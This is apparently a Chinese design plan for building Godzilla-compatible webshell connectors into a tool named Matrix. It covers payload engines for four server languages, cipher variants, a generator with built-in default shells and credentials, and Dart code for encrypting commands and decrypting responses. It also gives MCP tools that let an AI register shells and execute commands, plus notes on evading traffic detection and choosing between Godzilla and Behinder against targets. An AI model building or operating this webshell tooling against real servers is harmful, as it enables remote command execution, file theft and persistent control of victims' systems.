当前目录：`getBasicsInfo` 的 `CurrentDir`（`dirname($_SERVER['SCRIPT_FILENAME'])`）。

#### 5.5.3 ASPX（`payload.dll`，`CSHARP_AES_BASE64`）

与 PHP 类似（`cmdLine`、`getFile`、`readFileContent`、`uploadFile`…），差异：

- 加密是 AES/CBC，**key = IV = key16**。
- 响应同样 gzip（`CShapShell.evalFunc`）。
- 路径使用 Windows 分隔符；`getShellScriptDir` 从 `getBasicsInfo` 的 `RealFile` 解析。
- 首次播种是 `Assembly.Load`，之后 `CreateInstance("LY")`。

#### 5.5.4 ASP（`payload.asp`，`ASP_XOR_BASE64`）

- 与 PHP 的 `methodName` 体系接近（`cmdLine`、`getFile`、`readFileContent`…）。
- 无 gzip。
- 标记只有 6 个字符，见 §2.2。
- 能力：`shellExec`/`fileRead`/`fileWrite` 都可用；`getSystemInfo` 从 `getBasicsInfo` 解析。

#### 5.5.5 `getSystemInfo` 映射（UI 依赖）

`SystemInfoTab` 只认 Matrix 的固定别名（见 `lib/pages/system_info_tab.dart` 的 `_fieldAliases`）。`getBasicsInfo` 的原始 key 需要转换成这些别名，否则页面空白：

| Matrix 别名 | Godzilla 来源（按语言） |
| --- | --- |
| `OS` | PHP/Java: `OsInfo`；ASPX: `OSVersion` / `OS` |
| `运行用户` | `CurrentUser`（PHP/Java）或 `whoami` |
| `当前目录` | `CurrentDir` |
| `文档根目录` | `DocBase` / `RealFile` / `FileRoot` |
| `服务器IP` | `IPList`（Java）、`SERVER_ADDR`（PHP）、`LOCAL_ADDR`（ASPX） |
| `服务器软件` | PHP: `SERVER_SOFTWARE`；Java: `server.info`（若引擎提供） |
| `内存限制` | PHP: `memory_limit` |
| `最大执行时间` | PHP: `max_execution_time` |
| `Safe Mode` | PHP: `safe_mode` |
| `主机名` | `SERVER_NAME`，缺失时执行 `hostname` |
| `用户ID` | Linux: `id -u`；Windows: `whoami /user` |
| `内核版本` | Java: `os.version`；Linux 回退 `uname -r` |
| `.NET CLR 版本` | ASPX: `Version` |
| `禁用函数` | PHP: `disable_functions` |
| `已加载扩展` | PHP: `loaded_extensions` |

实现建议：`getSystemInfo` 先解析 `Key : Value` 到 `Map<String,String>`，再按上表生成别名；缺失的“主机名/用户ID/内核版本”用一次轻量 `execCommand` 补齐（仅当缺失时，避免每次多打一轮）。

> 验证状态：JSP 与 PHP 的映射已用真实 `godzilla.jsp` / 引擎源码逐项确认；ASPX / ASP 的映射来自引擎字节码与模板，Phase 4 需要各找一个真实目标确认 `getFile` / `readFileContent` 的返回细节（尤其 C# 是否对文本做 base64、经典 ASP 的编码）。

### 5.6 连接器类型与工厂（架构 + 协议 / 加密器分离）

与原版一致：**连接器只表示“架构 + 协议”，加密器是独立字段**。

- `connector_type` 只有 4 个：`php_godzilla` / `jsp_godzilla` / `aspx_godzilla` / `asp_godzilla`
- `webshells.cryption` 存上游加密器 ID（`PHP_XOR_BASE64` 等），空值时回退该架构默认（BASE64）
- `ConnectorFactory.create()` 用 `GodzillaVariant.resolveFor(connectorType, cryption)` 选具体变体
- UI：连接器下拉显示 `PHP · PHP-GZ`，下方 `Cryption (加密器)` 只列当前架构可用的加密器
- 数据迁移（v15）：旧的 `php_godzilla_raw` 等类型自动拆成 `php_godzilla` + `cryption=PHP_XOR_RAW`

老的“`connector_type` 即加密器”的对应关系（仅供迁移参考）：

| `connector_type` | `typeLabel` | `shortLabel` | Godzilla cryption | 默认参数 |
| --- | --- | --- | --- | --- |
| `php_godzilla` | `php` | `PHP-GZ` | `PHP_XOR_BASE64`（默认） | `mAtrix_911` |
| `jsp_godzilla` | `jsp` | `JSP-GZ` | `JAVA_AES_BASE64`（默认） | `mAtrix_911` |
| `aspx_godzilla` | `aspx` | `ASPX-GZ` | `CSHAP_AES_BASE64`（默认） | `mAtrix_911` |
| `asp_godzilla` | `asp` | `ASP-GZ` | `ASP_XOR_BASE64`（默认） | `mAtrix_911` |

- `fixedMethod = 'POST'`（四种变体都依赖 POST body）。
- `payloadHint` 指向“标准 Godzilla 马”的说明，而不是 Matrix 自研马。
- `usage`/`scenario` 写清楚“连接 Godzilla 生成的加密马；需要密码 + 密钥”。
- `defaultParam` 用 `AppConstants.defaultShellPassword`（与现有连接器一致）。

工厂里用一个 `_variantOf(connectorType)` 或让 `_ConnectorDefinition` 带 `variant` 字段，避免每个连接器重复解析。

> 后续若要加 `*_EX`/`*_RAW`，只加 `connector_type` + 变体枚举，不改协议层。

### 5.7 数据模型与迁移

`webshells` 表新增：

```sql
ALTER TABLE webshells ADD COLUMN secret_key TEXT NOT NULL DEFAULT 'key';
```

- 版本 13 → 14；`_onCreate` 直接建列，`_onUpgrade` 对 `oldVersion < 14` 执行 ALTER。
- `Webshell`：

```dart
final String secretKey;   // 默认 'key'
```

- `fromMap` 对旧记录回退 `'key'`。
- `toMap` / `copyWith` / DAO / MCP DB 全链路同步。
- 迁移旧记录：全部默认 `key`（Godzilla 的常见默认值；用户可在编辑框改）。

### 5.8 UI

1. **Add/Edit 对话框**：
   - 新增 `Key (secretKey)` 输入框，仅在 `connectorType.endsWith('_godzilla')` 时显示。
   - 默认值 `key`；旁边放一行说明：“Godzilla 的密钥字段，不是连接密码；密钥 = MD5(secretKey)[0:16]”。
   - 密码字段的提示继续用 `_PasswordParamField`（显示“参数名”语义）。
2. **连接器下拉**：当前是 `_connectorOptions()` 里的硬编码列表。建议改为：

```dart
List<(String, String)> _connectorOptions() => [
  for (final t in ConnectorFactory.allTypes)
    (t, '${ConnectorFactory.typeLabel(t).toUpperCase()} · ${ConnectorFactory.shortLabel(t)}'),
];
```

   这样新增连接器不会再漏改 UI。
3. **自动检测**：`_autoDetect` 增加 `secretKey` 参数：
   - 默认**不**探测 Godzilla；新增一个“尝试 Godzilla 协议”复选框（有 secretKey 时默认勾选），避免对普通马额外发 4 个播种请求。
   - 勾选后按 URL 扩展名收窄候选：`.jsp/.jspx` → `jsp_godzilla`；`.php` → `php_godzilla`；`.aspx/.ashx/.asmx` → `aspx_godzilla`；`.asp` → `asp_godzilla`。扩展名不可判断时按 `jsp → php → aspx → asp` 顺序串行探测，命中即停。
   - 探测顺序建议把 `jsp_godzilla` 放在 `jsp_classloader` 之前（JSP 标准马首包 34KB，比 ClassLoader 的 125s 超时便宜）。
   - `jsp_godzilla` 的 ping 超时给 15s（播种 + 一次调用）。
4. **列表/详情**：`shortLabel` 用 `JSP-GZ` 等，颜色沿用现有 JSP 紫色系。
5. **错误提示**：`lastPingDiagnostic` 区分：
   - `[Seed] HTTP 500`（引擎没发出去/被 WAF 拦）
   - `[Markers] not found (body=…)`（密钥/密码不匹配）
   - `[Decrypt] bad padding`（变体选错，例如把 AES 选成 XOR）
   - `[Session] empty response after reseed`（Session 失效或 shell 被删）

### 5.9 MCP

- `shell_add` 增加可选参数：

```dart
'secret_key': JsonSchema.string(
  description: 'Godzilla 密钥（secretKey），默认 key。仅 *_godzilla 连接器使用。',
),
```

- `shell_connectors` 的描述补充 4 个 Godzilla 类型；`catalog()` 现在对 Godzilla 连接器额外返回
  `default_cryption` 与 `cryptions: [{id, wire, note}]`，AI 不用猜加密器取值。
- `shell_list` 不返回 `secret_key`（敏感信息），只返回 `connector_type`。
- `shell_add` 的 `cryption` 会先校验：跨架构或非 Godzilla 连接器直接返回错误并列出可选值。
- `shell_list` 对 Godzilla 连接器回显实际生效的 `cryption`（空值显示为默认值）。
- 可选新增 `godzilla_engine_status`：报告本地引擎资产是否存在（便于 AI 诊断“为什么连不上”）。

### 5.10 种子化 / 载荷库

v1 不把 Godzilla 引擎当普通 payload 条目（它们是“连接依赖”，不是“用户上传的马”）。建议：

- `data/godzilla/*` 作为应用资产，随包分发（若授权允许）。
- README / 载荷库新增“Godzilla 标准马”条目时，只放 **shell 模板**（`shell.jsp` / `shell.php` 的生成结果），不放 39KB 引擎。
- v2 再做“生成 Godzilla 马”对话框：输入 pass/secretKey，渲染模板，存入 payload 库并可直接上传。

### 5.11 生成马（对应原版 Godzilla 的“创建 / 加密器”）

原版 Godzilla 在“添加 Shell”里提供 **生成** 按钮：选 Payload（语言）、选 Cryption（加密器）、填密码与密钥，产出 shell 源码。Matrix 提供等价能力，但生成的是 **Matrix 自写的协议兼容壳**（不是 Godzilla 的模板），配套 §5.10 的引擎播种。

**加密器清单**（`GodzillaCryption`，名称与原版一致）：

| Cryption | 语言 | 连接器 | 产物 | 说明 |
| --- | --- | --- | --- | --- |
| `PHP_XOR_BASE64` | PHP | `php_godzilla` | `shell.php` | XOR + Base64，带标记 |
| `PHP_XOR_RAW` | PHP | `php_godzilla_raw` | `shell.php` | 裸密文 |
| `PHP_EVAL_XOR_BASE64` | PHP | `php_godzilla_eval` | `shell.php` | 一句话 eval 壳，每次请求带装载器 |
| `JAVA_AES_BASE64` | JSP | `jsp_godzilla` | `shell.jsp` | AES/ECB + Base64 |
| `JAVA_AES_RAW` | JSP | `jsp_godzilla_raw` | `shell.jsp` | 裸密文 |
| `CSHAP_AES_BASE64` | ASPX | `aspx_godzilla` | `shell.aspx` | AES/CBC(key=IV) |
| `CSHAP_AES_RAW` | ASPX | `aspx_godzilla_raw` | `shell.aspx` | 裸密文 |
| `ASP_BASE64` | ASP | `asp_godzilla_b64` | `shell.asp` | 仅 base64，无加密 |
| `ASP_RAW` | ASP | `asp_godzilla_plainraw` | `shell.asp` | 裸 body，无加密无标记 |
| `ASP_XOR_BASE64` | ASP | `asp_godzilla` | `shell.asp` | XOR + base64，6 字符标记 |
| `ASP_XOR_RAW` | ASP | `asp_godzilla_raw` | `shell.asp` | 裸 XOR 密文 |

**未实现（3 个，上游有）**：

| Cryption | 原因 |
| --- | --- |
| `CSHAP_ASMX_AES_BASE64` | 需要 `.asmx` SOAP WebService 端点桩，不是普通 aspx 页面 |
| `CSHAP_EVAL_AES_BASE64` | 官方壳用 JScript `eval(..., "unsafe")` 动态编译，需要 JScript 引擎语义 |
| `ASP_EVAL_BASE64` | 官方壳是十六进制混淆 + 双层 `Execute`，需要 IIS 环境验证 |

**上游已标注但 UI 不展示（无 `@CryptionAnnotation`）**：`JavaAesBase64Ex`、`JavaAesWeblogic`、`CShapAesBase64Ex`、`CShapAsmxAesBase64Ex` —— 属于历史遗留类，本项目不实现。

> 命名说明：C# 变体在上游的 ID 就是 `CSHAP_*`（不是 `CSHARP_*`），这里保持一致，便于与原版 UI 对照。

**BASE64 vs RAW 的协议差异**：

| 环节 | BASE64 变体 | RAW 变体 | EVAL 变体 |
| --- | --- | --- | --- |
| 请求体 | `pass=<urlencoded base64(cipher)>` | 裸 `cipher` 字节 | `pass=<装载器>&<secretKey>=<base64(cipher)>` |
| Content-Type | `application/x-www-form-urlencoded` | `application/octet-stream` | `application/x-www-form-urlencoded` |
| 响应体 | `<left><base64(cipher)><right>` | 裸 `cipher` 字节 | 同 BASE64 |
| 壳 | 常驻 loader | 常驻 raw loader | `eval($_POST['pass'])` 一句话 |

**实现要点（都是实测踩出来的）**：

1. 密码会进 shell 字符串字面量：PHP 用单引号转义，JSP/C#/ASP 用双引号转义；同时把密码限制为 `[A-Za-z0-9_.-]{1,64}`，避免生成出无法解析的壳。
2. **JSP 不能声明名为 `out` 的局部变量** —— `out` 是 JSP 隐式对象，Jasper 直接报 `Duplicate local variable out`。模板里改用 `mxOut`。
3. **JSP/C# 响应标记必须大写** —— Java/C# 变体的 client 端按 `toUpperCase()` 匹配；漏掉会得到“标记未找到”。
4. ASP 的 XOR 下标是 `Mid(key, (i Mod keySize) + 1, 1)`（`i` 从 1 开始），等价于 `key[(j+1) & 15]`，写成 `(i-1)` 会整体错位一个字节。
5. 产物统一 `\r\n` 换行；PHP 壳以 `?>` **闭合**（用户反馈过“看起来没结束”），
   实测 PHP 会吞掉 `?>` 后的换行，不会污染 RAW 变体的二进制响应。
6. **RAW 版 JSP 不能用 `response.getOutputStream()` 直接收尾** —— JSP 隐式 `out` 在页面释放时会调用 `response.getWriter()`，已调用 `getOutputStream()` 会导致 `IllegalStateException`（HTTP 500）。必须在写出前 `out.clear(); out = pageContext.pushBody();`。
7. **JSP 的 `CurrentDir` 是进程 cwd，不是马所在目录** —— 必须像 `jsp_behinder` 那样按文件名真实定位（见 §5.4）；否则进入交互页后终端停 `/usr/local/tomcat` 而不是 `webapps/ROOT`。
8. **连接器类型判断不能用 `endsWith('_godzilla')`** —— RAW 变体是 `*_godzilla_raw`，会漏掉密钥/加密器字段。统一用 `ConnectorFactory.isGodzilla(type)`（`contains('godzilla')`）。
9. **EVAL 变体的响应标记基于 `secretKey` 而不是连接密码** —— 装载器把 secretKey 当作自己的参数名，`md5(pass + key16)` 里的 `pass` 因此是 secretKey。用 `GodzillaVariant.markerUsesSecretKey` 表达这个差异（实测：用连接密码算标记会导致 `[Markers] not found`）。

**UI 入口（已按反馈移除）**：

运行时“生成马”对话框已删除，改为**内置默认马**，避免用户在连接界面里再选一次加密器：

- 载荷库内置 8 个默认 Godzilla 马（密码 `mAtrix_911` / 密钥 `key`，`SeedService` sinceVersion 17）：
  `godzilla_php_xor_base64.php`、`godzilla_php_xor_raw.php`、`godzilla_php_eval_xor_base64.php`、
  `godzilla_jsp_aes_base64.jsp`、`godzilla_jsp_aes_raw.jsp`、`godzilla_aspx_aes_base64.aspx`、
  `godzilla_asp_xor_base64.asp`、`godzilla_asp_raw.asp`
- 资产由 `tool/godzilla_engine/render_default_shells.dart` 调用生成器产出，改模板后重跑即可
- `godzilla_shell_generator.dart` 保留为纯函数库（供该脚本与测试使用），不再暴露 UI

**闭环验证**：`MATRIX_GODZILLA_SHELL_E2E=1 flutter test test/connectors/godzilla_shell_e2e_test.dart` 会真的生成 PHP 壳、用 `php -S` 起服务、再用连接器连上去执行命令与文件读写。JSP 侧已用 `docker cp` 部署到本地 Tomcat 手工验证（生成→部署→`ping`/`id`/文件读写全部通过）。

---

## 6. 关键代码骨架

### 6.1 变体枚举

```dart
enum GodzillaVariant {
  phpXorBase64(
    language: 'php',
    cipher: GodzillaCipher.xor,
    marker: GodzillaMarkerStyle.lower16,
    gzipRequest: false,
    gzipResponse: 'sniff',
    engineAsset: 'data/godzilla/payload.php.b64',
  ),
  javaAesBase64(
    language: 'jsp',
    cipher: GodzillaCipher.aesEcb,
    marker: GodzillaMarkerStyle.upper16,
    gzipRequest: true,
    gzipResponse: 'always',
    engineAsset: 'data/godzilla/payload.classs.b64',
  ),
  csharpAesBase64(
    language: 'aspx',
    cipher: GodzillaCipher.aesCbcKeyIv,
    marker: GodzillaMarkerStyle.upper16,
    gzipRequest: true,
    gzipResponse: 'always',
    engineAsset: 'data/godzilla/payload.dll.b64',
  ),
  aspXorBase64(
    language: 'asp',
    cipher: GodzillaCipher.xor,
    marker: GodzillaMarkerStyle.lowerAsp6,
    gzipRequest: false,
    gzipResponse: 'never',
    engineAsset: 'data/godzilla/payload.asp.b64',
  );

  const GodzillaVariant({...});
  final String language;
  final GodzillaCipher cipher;
  final GodzillaMarkerStyle marker;
  final bool gzipRequest;
  final String gzipResponse; // always / sniff / never
  final String engineAsset;
}
```

### 6.2 响应提取

```dart
static Uint8List? extractResponse({
  required Uint8List rawBody,
  required String password,
  required String key16,
  required GodzillaVariant variant,
}) {
  if (rawBody.isEmpty) return null;
  final text = latin1.decode(rawBody, allowInvalid: true);
  final m = markers(password: password, key16: key16, style: variant.marker);
  final start = text.indexOf(m.left);
  if (start < 0) return null;
  final end = text.indexOf(m.right, start + m.left.length);
  if (end < 0) return null;

  final b64 = text
      .substring(start + m.left.length, end)
      .replaceAll(RegExp(r'\s'), '');
  if (b64.isEmpty || b64.length % 4 != 0) return null;

  final cipher = base64.decode(b64);
  final plain = switch (variant.cipher) {
    GodzillaCipher.aesEcb => aesEcbDecrypt(cipher, key16),
    GodzillaCipher.aesCbcKeyIv => aesCbcDecrypt(cipher, key16),
    GodzillaCipher.xor => xor(cipher, key16),
  };
  return switch (variant.gzipResponse) {
    'always' => Uint8List.fromList(gzipDecompress(plain)),
    'sniff' => maybeGunzip(plain),
    _ => plain,
  };
}
```

### 6.3 参数发送

```dart
/// [method] 是 Godzilla 的 methodName；[extra] 是语言相关参数。
Future<Uint8List> call(String method, [Map<String, List<int>> extra = const {}]) async {
  await ensureSeeded();
  final params = <String, List<int>>{
    'methodName': utf8.encode(method),
    ...extra,
  };
  final raw = GodzillaCodec.encodeParams(params);
  final payload = variant.gzipRequest
      ? Uint8List.fromList(gzipCompress(raw))
      : raw;
  final cipher = switch (variant.cipher) {
    GodzillaCipher.aesEcb => GodzillaCrypto.aesEcbEncrypt(payload, key16),
    GodzillaCipher.aesCbcKeyIv => GodzillaCrypto.aesCbcEncrypt(payload, key16),
    GodzillaCipher.xor => GodzillaCrypto.xor(payload, key16),
  };
  final body = '${Uri.encodeComponent(password)}='
      '${Uri.encodeComponent(base64.encode(cipher))}';
  final resp = await _post(body);
  final out = GodzillaCrypto.extractResponse(
    rawBody: resp,
    password: password,
    key16: key16,
    variant: variant,
  );
  if (out == null) throw GodzillaProtocolException(...);
  return out;
}
```

---

## 7. 分阶段实施计划

### Phase 0 — 资产与脚手架（0.5 天）

- 从 `godzilla.jar` 提取 4 个引擎，转成 `.b64` 放入 `data/godzilla/`。
- 写 `tool/extract_godzilla_payloads.sh`（macOS/Linux；Windows 用 WSL 或 7z）。
- 在 `pubspec.yaml` 注册资产目录。
- 产出：4 个资产 + 提取脚本 + README 说明。

### Phase 1 — 协议层 + 单测（1.5 天）

- `godzilla_crypto.dart`、`godzilla_codec.dart`。
- `test/godzilla_crypto_test.dart`：用 §附录 A 的权威向量断言 key16、markers、params（含小端）、AES、XOR、gzip、响应提取。
- 完成标准：`flutter test test/godzilla_crypto_test.dart` 全绿；与 Java 端逐字节一致。

### Phase 2 — Transport + JSP 连接器（2 天）

- `godzilla_transport.dart`、`godzilla_connector_base.dart`、`godzilla_jsp_connector.dart`。
- 实现 §5.5.1 全部操作。
- 在 `127.0.0.1:8082/godzilla.jsp` 上手工验收：id、列目录、读、写、删、二进制读写、系统信息、当前目录。
- 完成标准：`ping()` 成功；`executeCommand('id')` 含 `uid=`；文件操作往返一致。

### Phase 3 — 数据模型 + 工厂 + UI + MCP（1.5 天）

- `secret_key` 迁移、模型、DAO、MCP DB。
- 工厂 4 个定义（先只启用 `jsp_godzilla`，其余占位）。
- UI Key 字段 + 下拉改成工厂驱动 + 自动检测传 secretKey。
- MCP `shell_add` 增加 `secret_key`。
- 完成标准：UI 能新增/编辑/连接 `jsp_godzilla`；MCP 能创建并执行命令。

### Phase 4 — PHP / ASPX / ASP（3 天）

- 三个连接器 + 各自的语言差异（PHP 无 gzip 请求、ASP 6 字符标记、C# key=IV）。
- 每语言至少一个真实目标验收；没有目标时用本地容器（php-apache / Tomcat / IIS Express）搭。
- 完成标准：四语言 ping + 命令 + 文件读写。

### Phase 5 — 自动检测 + 文档 + 回归（1 天）

- 自动检测覆盖 Godzilla；超时/诊断完善。
- README 连接器表、`docs/` 使用说明。
- `flutter analyze`、`flutter test`、手工冒烟（`docs/smoke-regression.md`）。

### Phase 6 —（可选，v2）

- `*_EX` / `*_RAW` / `JAVA_AES_WEBLOGIC` 变体。
- ~~Godzilla 马生成器（pass/secretKey → shell 文本）~~ —— 已在 §5.11 实现（4 种 base64 加密器）。
- Matrix 原生 Godzilla 马（不依赖 39KB 引擎）。
- 内存马注入。
- `reqLeft`/`reqRight`、自定义 Header、代理。

**总计**：MVP（Phase 0–3，仅 JSP）= 5.5 天；四语言 v1（Phase 0–5）= 9.5 天。

### 建议的 PR 切分

| PR | 内容 | 可独立合并 | 验收 |
| --- | --- | --- | --- |
| PR1 | `godzilla_crypto.dart` + `godzilla_codec.dart` + 单测 | 是（无调用方） | `flutter test test/godzilla_*_test.dart` |
| PR2 | `godzilla_transport.dart` + `godzilla_connector_base.dart` + `godzilla_jsp_connector.dart` + 工厂注册 | 是（新增类型，不影响旧类型） | 手工连 `godzilla.jsp` |
| PR3 | `secret_key` 迁移 + 模型/DAO/MCP DB + UI Key 字段 + 自动检测 | 是 | UI/MCP 全链路 |
| PR4 | PHP / ASPX / ASP 连接器 | 是 | 各语言 ping + 命令 + 文件 |
| PR5 | 文档 + README + 冒烟 | 是 | `docs/smoke-regression.md` |

> PR1 单独合并的好处：协议层可被后续任何“Godzilla 风格”功能复用（原生马、EX/RAW 变体、生成器），且不引入数据迁移风险。

---

## 8. 测试计划

### 8.1 单元测试（必须）

`test/godzilla_crypto_test.dart`：

| 用例 | 断言 |
| --- | --- |
| `deriveKey16('key')` | `3c6e0b8a9c15224a` |
| `markers('mAtrix_911', key16, upper16)` | `371BE1CA27DE980E` / `4CFD279AB200099A` |
| `markers(..., lower16)` | 小写版本 |
| `markers(..., lowerAsp6)` | `371be1` / `279ab2` |
| `encodeParams({'cmdLine': 'id'})` | `636d644c696e6502020000006964` |
| `encodeParams({'methodName': 'execCommand'})` | `6d6574686f644e616d65020b00000065786563436f6d6d616e64` |
| `xor` 往返 | 加密后再 XOR 还原 |
| `aesEcb` 往返 | 还原 |
| `aesCbcKeyIv` 往返 | 还原 |
| `extractResponse`（Java 合成响应） | 返回 gzip 字节，gunzip 后等于原文 |
| `extractResponse`（标记缺失） | `null`，不抛异常 |
| `extractResponse`（非 4 倍数 base64） | `null` |

`test/godzilla_codec_test.dart`：

- 参数含二进制/中文/空值。
- 长度字段小端断言（`len=2` → `02 00 00 00`）。
- gzip 嗅探。

### 8.2 集成测试（手工/可选自动）

用环境变量门控，避免 CI 依赖真实目标：

```
MATRIX_GODZILLA_TEST_URL=http://127.0.0.1:8082/godzilla.jsp
MATRIX_GODZILLA_TEST_PASS=mAtrix_911
MATRIX_GODZILLA_TEST_KEY=key
```

断言：ping、`id`、`getFile /`、`readFile /etc/hostname`、`uploadFile`/`readFile` 二进制往返、`deleteFile`。

### 8.3 回归

- `flutter analyze`（重点：`lib/connectors/`、`lib/models/webshell.dart`、`lib/mcp/`）。
- `flutter test`。
- 手工冒烟：现有 `php_eval`、`jsp_behinder`、`aspx_behinder` 各连一次，确认未被 `secret_key` 迁移影响。

---

## 8.5 明文泄漏面（实测）

用抓包方式核对 Matrix 实际发出的报文：

| 变体 | 连接密码 | 参数内容 | secretKey / key16 |
| --- | --- | --- | --- |
| `*_BASE64`（PHP/XOR、JSP、ASPX、ASP_XOR） | **明文**（作为 HTTP 参数名） | AES/XOR 加密 | 不出现（仅隐含在密文里） |
| `*_RAW` | **明文**（参数名） | 加密，裸字节 | 不出现 |
| `PHP_EVAL_XOR_BASE64` | **明文**（参数名） | 装载器 base64+反转（是混淆不是加密） | **不出现**（已修复，见下） |
| `ASP_BASE64` / `ASP_RAW` | 明文 / 无参数名 | **完全不加密** | 不适用 |

结论：

1. **密码一定以明文出现在 HTTP 报文里**——Godzilla 协议把密码当作参数名，这是上游设计，无法在不破坏兼容性的前提下改掉。
2. **XOR 变体的密文可被已知明文恢复**：参数以 `methodName\x02...` 开头，抓到一条就能还原 key16。只应视为混淆。
3. **`ASP_BASE64` / `ASP_RAW` 没有加密**，等同明文。
4. `secretKey` 与 key16 **不会**出现在报文里（EVAL 变体曾经会，已修复）。

因此：**Godzilla 连接器必须走 HTTPS**。在 HTTP 下，任何变体都会把连接密码暴露给链路中间人；XOR / ASP_BASE64 / ASP_RAW 的正文也等同明文。

### 修复记录：EVAL 变体曾泄漏密钥

初版 `PHP_EVAL_XOR_BASE64` 沿用上游做法：每次请求都发送装载器源码（base64+反转，非加密），而装载器里含 `$pass = '<secretKey>'` 与 `$key = '<key16>'`。抓包解码后可读到：

```php
$pass = 'sup3r-secret';
$key  = '3c6e0b8a9c15224a';
```

现已改为：

- **壳里存密钥**：`$mxk = '<key16>'; eval($_POST['<password>']);`
- **装载器不含密钥**：改为读 `$mxk`，数据字段用固定名 `mxdata`
- **标记也基于 `mxdata`**：`md5('mxdata' + key16)`（`GodzillaVariant.markerPassword`）

抓包复测：报文中只剩密码（参数名），`secretKey`/key16 不再出现。回归测试见
`test/connectors/godzilla_transport_test.dart` 的「eval 变体不把密钥发到线上」。

> 兼容性代价：该加固后的 eval 壳不再兼容“上游 Godzilla 的 eval 客户端/壳”（上游把密钥放在装载器里）。这是有意的取舍，已在 UI 说明与 README 标注。

## 8.6 与 Behinder（冰蝎）的安全对比

同样用抓包核对 Matrix 自己的两套实现（不是对比社区传闻）：

| 维度 | Behinder（Matrix 实现） | Godzilla（Matrix 实现） |
| --- | --- | --- |
| 密码是否上送 | **不上送**，只做密钥 `md5(pass)[0:16]` | **明文上送**（作为 HTTP 参数名） |
| 请求形态 | `application/octet-stream`，body 是不透明密文 | `x-www-form-urlencoded`，`<密码>=<base64>` |
| PHP 加密 | AES-128-CBC（零 IV）；无 openssl 时退化为 XOR | **只有 XOR** |
| JSP 加密 | AES/ECB + base64 | AES/ECB + base64 + md5 标记 |
| ASPX 加密 | AES-CBC（key=IV） | AES-CBC（key=IV）+ md5 标记 |
| 响应特征 | 纯 base64 密文（JSP 可能带 magic 尾） | `<标记><base64><标记>`，标记位置固定 |
| 首包体积（实测） | PHP 940B / JSP 19.6KB / ASPX 8.7KB | PHP 13.7KB / JSP ≈46KB（引擎 base64） |
| 密钥分离 | 密码即密钥（一个字段） | password（参数名）与 secretKey（密钥材料）分离 |
| 抗重放 / 完整性 | 无 nonce、无 MAC | 无 nonce、无 MAC |

结论：

1. **纯密码学强度：Behinder 更强**。它全语言用 AES（至少 PHP/JSP/ASPX），而 Godzilla 的 PHP/ASP 只有 XOR —— 已知明文（参数以 `methodName\x02` 开头）即可还原 key16，等价于混淆。
2. **凭证暴露：Behinder 明显更好**。Behinder 报文里看不到密码；Godzilla 每个变体都把密码当参数名发出去，中间人直接拿到连接密码。
3. **密钥管理：Godzilla 的设计更规范**（password / secretKey 分离），但因为密码上送，这个优势被抵消。
4. **流量指纹**：两者都已是公开特征；Godzilla 的「单参数超长 base64 + 两端 md5 标记 + 固定长度响应」更容易被规则命中；Behinder 的纯二进制/纯 base64 稍好，但首包体积同样可疑。
5. **共同短板**：都没有 nonce/时间戳/完整性校验，抓到的请求可以原样重放；密文都是确定性加密（零 IV / 固定 IV / ECB），相同明文产生相同密文。

实践建议：

- 目标语言是 **PHP / ASP** → 优先 Behinder（Godzilla 在该语言下只有 XOR）。
- 目标是 **JSP / ASPX** → 两者都是 AES，差异不大；若在意“密码不上送”，选 Behinder。
- 两者都**必须走 HTTPS**；HTTP 下 Behinder 至少不泄密码，但仍可被重放。
- 不要把 Matrix 默认的 `mAtrix_911` / `key` 用到真实目标上——默认值本身就是指纹。

## 8.7 与原版客户端的兼容性核对（实测）

用原版 `godzilla.jar` 的 `JavaAesBase64` + `JavaShell` + `util.http.Http`
对本地抓包服务器发真实请求，与 Matrix 的 Dart 客户端逐项对比：

| 项目 | 原版客户端（实测） | Matrix | 结论 |
| --- | --- | --- | --- |
| 方法 / 路径 | `POST <url>` | 同 | ✅ |
| Content-Type | `application/x-www-form-urlencoded` | 同 | ✅ |
| 请求体 | `<密码>=<urlencode(base64(cipher))>` | 同 | ✅ |
| URL 编码 | `URLEncoder`（`+`→`%2B`、`/`→`%2F`、`=`→`%3D`） | `Uri.encodeComponent` | ✅ 等价（base64 字符集内结果一致） |
| 播种 | `Http` 把 payload 交给 cryption 编码后发送 | 同（`_doSeed`） | ✅ |
| 参数 gzip（Java/C#） | `gzipE` 后再加密 | 同 | ✅ |
| 响应解析 | `findStr` 取标记 → base64 → AES/ECB | 同（另加前导零容错与 gzip 嗅探） | ✅ |
| 参数顺序 | `HashMap` 迭代序 | 插入序 | 不影响协议，但**同一逻辑请求的密文不同** |
| User-Agent | `Java/17.0.21` | 原来 `Dart/3.x (dart:io)` → 已改为 Chrome UA | 已修（UA 是明显指纹） |
| Accept | `text/html, image/gif, image/jpeg, */*; q=0.2` | 同（对齐原版） | ✅ |

**双向解密验证**：

- 抓到的原版请求 → `GodzillaCrypto.aesEcbDecrypt` + gunzip → 解出
  `argsCount=1 / arg-0=id / methodName=execCommand`（53B 参数，80B 密文）
- Matrix 生成的请求体 → 原版算法（`Cipher("AES")` + `gzipD`）→ 解出同样参数

即两端的报文格式 **互相可解**。

### 已知的有意偏差

| 偏差 | 原因 |
| --- | --- |
| `PHP_EVAL_XOR_BASE64` 的壳与装载器不兼容上游 | 为了让密钥不上线（见 §8.5），装载器改为读壳里的 `$mxk`，数据字段固定 `mxdata` |
| 参数顺序不同 | 无影响；只影响密文逐字节比较 |
| 首次播种的时机 | Matrix 在第一次 `call` 前显式播种；原版在 `cryption.init` 里播种，等价 |

## 9. 风险与对策

### 9.1 引擎资产授权（高）

Godzilla 上游通常以 GPL-3.0 发布（以你实际使用的版本/二开版为准），Matrix 是 Apache-2.0。直接把 `payload.php/classs/dll/asp` 放进 Matrix 仓库存在再分发风险。

三种方案：

| 方案 | 做法 | 优点 | 缺点 |
| --- | --- | --- | --- |
| A. 随包分发 | 提交 `.b64` 资产 | 开箱即用 | GPL 再分发风险；需在 `NOTICE` 说明 |
| B. 运行时提取（推荐） | 用户配置 `godzilla.jar` 路径；Matrix 用最小 ZIP 读取器提取到缓存目录 | 不再分发 GPL 代码；行为与用户本地 Godzilla 一致 | 首次使用需配置；多一个 ZIP 解析器 |
| C. 重新实现 | Matrix 自写 PHP/JSP/C#/ASP 引擎 | 完全可控、可裁剪 | 工作量大；JSP/C# 尤其重 |

**最终选择：自研引擎（D 方案）。**

用户要求“不用 jar，协议用 Dart 重写”。因此既不随包分发 Godzilla 的引擎，也不在运行时读取 jar，而是：

- 协议（密钥、标记、AES/XOR、参数序列化、gzip、播种）全部用 Dart 实现；
- 目标端引擎改由 Matrix 自己实现，源码在 `tool/godzilla_engine/`：
